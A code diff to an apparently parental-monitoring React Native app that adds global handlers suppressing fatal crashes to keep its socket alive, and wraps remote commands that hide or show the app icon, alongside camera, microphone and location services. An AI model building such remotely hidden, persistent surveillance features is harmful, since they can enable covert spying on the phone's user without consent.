@@ -11,6 +11,29 @@ import { io } from 'socket.io-client';
 
 const BACKEND_URL = 'http://192.168.1.24:8443';
 
+// =====================================================
+// Global Error Handlers - Prevent uncaught crashes
+// =====================================================
+
+// Catch uncaught JS exceptions (prevents app process death → socket disconnect)
+const defaultHandler = ErrorUtils.getGlobalHandler();
+ErrorUtils.setGlobalHandler((error, isFatal) => {
+  console.error('[GLOBAL ERROR]', isFatal ? 'FATAL:' : 'NON-FATAL:', error?.message || error);
+  // Do NOT re-throw fatal errors — let the app stay alive
+  if (!isFatal && defaultHandler) {
+    defaultHandler(error, isFatal);
+  }
+});
+
+// Catch unhandled Promise rejections
+if (typeof global !== 'undefined') {
+  const originalHandler = global.onunhandledrejection;
+  global.onunhandledrejection = (event) => {
+    console.error('[UNHANDLED PROMISE REJECTION]', event?.reason?.message || event?.reason || event);
+    if (originalHandler) originalHandler(event);
+  };
+}
+
 export default function App() {
   const [serverUrl, setServerUrl] = useState('http://192.168.1.24:8443');
   const [parentId, setParentId] = useState('');
@@ -240,11 +263,19 @@ export default function App() {
       });
 
       socket.on('app-hide-command', async () => {
-        await VisibilityService.hideAppIcon();
+        try {
+          await VisibilityService.hideAppIcon();
+        } catch (e) {
+          console.error('[Android Socket] App hide error:', e.message);
+        }
       });
 
       socket.on('app-show-command', async () => {
-        await VisibilityService.showAppIcon();
+        try {
+          await VisibilityService.showAppIcon();
+        } catch (e) {
+          console.error('[Android Socket] App show error:', e.message);
+        }
       });
 
       setServices({ camera: camSvc, mic: micSvc, location: locSvc, usage: usageSvc });
